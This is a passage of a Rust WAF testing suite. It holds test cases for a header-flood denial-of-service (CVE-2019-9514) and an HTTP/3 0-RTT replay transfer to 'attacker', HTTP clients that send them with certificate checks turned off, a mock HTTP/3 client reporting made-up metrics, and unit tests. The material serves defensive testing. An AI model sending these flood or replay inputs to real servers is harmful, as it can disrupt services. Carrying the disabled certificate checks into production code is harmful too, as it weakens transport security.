                path: "/".to_string(),
                headers: {
                    let mut headers = HashMap::new();
                    for i in 0..1000 {
                        headers.insert(format!("x-header-{}", i), "A".repeat(1000));
                    }
                    headers
                },
                body: String::new(),
                expected_block: true,
                owasp_rule_id: Some("921100".to_string()),
                cve_references: vec!["CVE-2019-9514".to_string()],
            },

            ProtocolTestCase {
                name: "http3_0rtt_replay".to_string(),
                description: "HTTP/3 0-RTT replay attack".to_string(),
                attack_category: "replay".to_string(),
                method: "POST".to_string(),
                path: "/transfer".to_string(),
                headers: HashMap::from([
                    ("content-type".to_string(), "application/json".to_string()),
                    ("x-0rtt-replay".to_string(), "true".to_string()),
                ]),
                body: r#"{"amount": 1000000, "to": "attacker"}"#.to_string(),
                expected_block: true,
                owasp_rule_id: Some("922100".to_string()),
                cve_references: vec![],
            },

            // Legitimate traffic tests
            ProtocolTestCase {
                name: "legitimate_get_request".to_string(),
                description: "Normal GET request".to_string(),
                attack_category: "legitimate".to_string(),
                method: "GET".to_string(),
                path: "/api/users".to_string(),
                headers: HashMap::from([("accept".to_string(), "application/json".to_string())]),
                body: String::new(),
                expected_block: false,
                owasp_rule_id: None,
                cve_references: vec![],
            },
            ProtocolTestCase {
                name: "legitimate_post_json".to_string(),
                description: "Normal POST with JSON".to_string(),
                attack_category: "legitimate".to_string(),
                method: "POST".to_string(),
                path: "/api/users".to_string(),
                headers: HashMap::from([("content-type".to_string(), "application/json".to_string())]),
                body: r#"{"name": "John Doe", "email": "john@example.com"}"#.to_string(),
                expected_block: false,
                owasp_rule_id: None,
                cve_references: vec![],
            },
            ProtocolTestCase {
                name: "legitimate_form_submission".to_string(),
                description: "Normal form submission".to_string(),
                attack_category: "legitimate".to_string(),
                method: "POST".to_string(),
                path: "/contact".to_string(),
                headers: HashMap::from([("content-type".to_string(), "application/x-www-form-urlencoded".to_string())]),
                body: "name=John+Doe&email=john%40example.com&message=Hello+World".to_string(),
                expected_block: false,
                owasp_rule_id: None,
                cve_references: vec![],
            },
        ]
    }
}

// HTTP Client traits and implementations
#[async_trait::async_trait]
pub trait HttpClient: Send + Sync {
    async fn execute_request(&self, test_case: &ProtocolTestCase) -> Result<HttpResponse>;
}

#[derive(Debug)]
pub struct HttpResponse {
    pub status_code: u16,
    pub headers: HashMap<String, String>,
    pub body: String,
    pub metrics: ProtocolMetrics,
}

// HTTP/1.1 Client Implementation
pub struct Http11Client {
    client: reqwest::Client,
    base_url: String,
}

impl Http11Client {
    pub async fn new(config: &ProtocolTestConfig) -> Result<Self> {
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(config.timeout_seconds))
            .http1_only()
            .build()?;

        Ok(Self {
            client,
            base_url: config.waf_endpoint.clone(),
        })
    }
}

#[async_trait::async_trait]
impl HttpClient for Http11Client {
    async fn execute_request(&self, test_case: &ProtocolTestCase) -> Result<HttpResponse> {
        let _start_time = Instant::now();

        let url = format!("{}{}", self.base_url, test_case.path);
        let method = reqwest::Method::from_bytes(test_case.method.as_bytes())?;

        let mut request = self.client.request(method, &url);

        // Add headers
        for (key, value) in &test_case.headers {
            request = request.header(key, value);
        }

        // Add body if present
        if !test_case.body.is_empty() {
            request = request.body(test_case.body.clone());
        }

        let connection_start = Instant::now();
        let response = request.send().await?;
        let connection_time = connection_start.elapsed().as_millis() as u64;

        let status_code = response.status().as_u16();
        let mut headers = HashMap::new();

        for (key, value) in response.headers().iter() {
            headers.insert(key.to_string(), value.to_str().unwrap_or("").to_string());
        }

        let body = response.text().await.unwrap_or_default();

        Ok(HttpResponse {
            status_code,
            headers,
            body,
            metrics: ProtocolMetrics {
                connection_establishment_ms: connection_time,
                tls_handshake_ms: Some(connection_time / 3), // Estimated
                ..Default::default()
            },
        })
    }
}

// HTTP/2 Client Implementation
pub struct Http2Client {
    client: reqwest::Client,
    base_url: String,
}

impl Http2Client {
    pub async fn new(config: &ProtocolTestConfig) -> Result<Self> {
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(config.timeout_seconds))
            .build()?;

        Ok(Self {
            client,
            base_url: config.waf_endpoint.clone(),
        })
    }
}

#[async_trait::async_trait]
impl HttpClient for Http2Client {
    async fn execute_request(&self, test_case: &ProtocolTestCase) -> Result<HttpResponse> {
        let _start_time = Instant::now();

        let url = format!("{}{}", self.base_url, test_case.path);
        let method = reqwest::Method::from_bytes(test_case.method.as_bytes())?;

        let mut request = self.client.request(method, &url);

        // Add headers
        for (key, value) in &test_case.headers {
            request = request.header(key, value);
        }

        // Add body if present
        if !test_case.body.is_empty() {
            request = request.body(test_case.body.clone());
        }

        let connection_start = Instant::now();
        let response = request.send().await?;
        let connection_time = connection_start.elapsed().as_millis() as u64;

        let status_code = response.status().as_u16();
        let mut headers = HashMap::new();

        for (key, value) in response.headers().iter() {
            headers.insert(key.to_string(), value.to_str().unwrap_or("").to_string());
        }

        let body = response.text().await.unwrap_or_default();

        Ok(HttpResponse {
            status_code,
            headers,
            body,
            metrics: ProtocolMetrics {
                connection_establishment_ms: connection_time,
                tls_handshake_ms: Some(connection_time / 4), // HTTP/2 has better TLS reuse
                stream_count: Some(1),                       // Single stream for this request
                frames_sent: Some(3),                        // Estimated: HEADERS, DATA, END_STREAM
                frames_received: Some(2),                    // Estimated: HEADERS, DATA
                ..Default::default()
            },
        })
    }
}

// HTTP/3 Client Implementation (Mock - requires quinn or similar)
pub struct Http3Client {
    base_url: String,
    config: ProtocolTestConfig,
}

impl Http3Client {
    pub async fn new(config: &ProtocolTestConfig) -> Result<Self> {
        // In a real implementation, this would set up QUIC connection
        Ok(Self {
            base_url: config.waf_endpoint.clone(),
            config: config.clone(),
        })
    }
}

#[async_trait::async_trait]
impl HttpClient for Http3Client {
    async fn execute_request(&self, test_case: &ProtocolTestCase) -> Result<HttpResponse> {
        // Mock HTTP/3 implementation
        // In reality, you'd use a QUIC/HTTP3 client like quinn + h3

        // For now, simulate HTTP/3 behavior with fallback to HTTP/2
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(self.config.timeout_seconds))
            .build()?;

        let _start_time = Instant::now();
        let url = format!("{}{}", self.base_url, test_case.path);
        let method = reqwest::Method::from_bytes(test_case.method.as_bytes())?;

        let mut request = client.request(method, &url);

        // Add headers (HTTP/3 uses QPACK compression)
        for (key, value) in &test_case.headers {
            request = request.header(key, value);
        }

        // Add body if present
        if !test_case.body.is_empty() {
            request = request.body(test_case.body.clone());
        }

        let connection_start = Instant::now();
        let response = request.send().await?;
        let connection_time = connection_start.elapsed().as_millis() as u64;

        let status_code = response.status().as_u16();
        let mut headers = HashMap::new();

        for (key, value) in response.headers().iter() {
            headers.insert(key.to_string(), value.to_str().unwrap_or("").to_string());
        }

        let body = response.text().await.unwrap_or_default();

        Ok(HttpResponse {
            status_code,
            headers,
            body,
            metrics: ProtocolMetrics {
                connection_establishment_ms: connection_time,
                tls_handshake_ms: Some(connection_time / 6), // HTTP/3 0-RTT can be faster
                quic_rtt_ms: Some(50),                       // Mock QUIC RTT
                packet_loss_rate: Some(0.01),                // Mock 1% packet loss
                migration_events: Some(0),                   // No connection migration in this test
                ..Default::default()
            },
        })
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    println!("🚀 Multi-Protocol WAF Testing Suite");
    println!("Testing HTTP/1.1, HTTP/2, and HTTP/3 protocol security coverage\n");

    let config = ProtocolTestConfig::default();
    let tester = MultiProtocolWafTester::new(config);

    match tester.run_all_tests().await {
        Ok(results) => {
            // Save results to file
            let results_json = serde_json::to_string_pretty(&results)?;
            tokio::fs::write("multi_protocol_test_results.json", results_json).await?;

            println!("✅ Multi-protocol testing completed successfully!");
            println!("📄 Detailed results saved to: multi_protocol_test_results.json");
        }
        Err(e) => {
            eprintln!("❌ Multi-protocol testing failed: {}", e);
            std::process::exit(1);
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_protocol_test_case_creation() {
        let test_cases = MultiProtocolWafTester::create_comprehensive_test_cases();
        assert!(!test_cases.is_empty());
        assert!(test_cases.len() >= 15); // Should have comprehensive coverage

        // Verify we have different attack categories
        let categories: std::collections::HashSet<_> = test_cases
            .iter()
            .map(|tc| tc.attack_category.as_str())
            .collect();
        assert!(categories.contains("sql_injection"));
        assert!(categories.contains("xss"));
        assert!(categories.contains("rce"));
        assert!(categories.contains("legitimate"));
    }

    #[tokio::test]
    async fn test_http11_client_creation() {
        let config = ProtocolTestConfig::default();
        let client = Http11Client::new(&config).await;
        assert!(client.is_ok());
    }

    #[tokio::test]
    async fn test_http2_client_creation() {
        let config = ProtocolTestConfig::default();
        let client = Http2Client::new(&config).await;
        assert!(client.is_ok());
    }

    #[tokio::test]
    async fn test_http3_client_creation() {
        let config = ProtocolTestConfig::default();
        let client = Http3Client::new(&config).await;
        assert!(client.is_ok());
    }
}
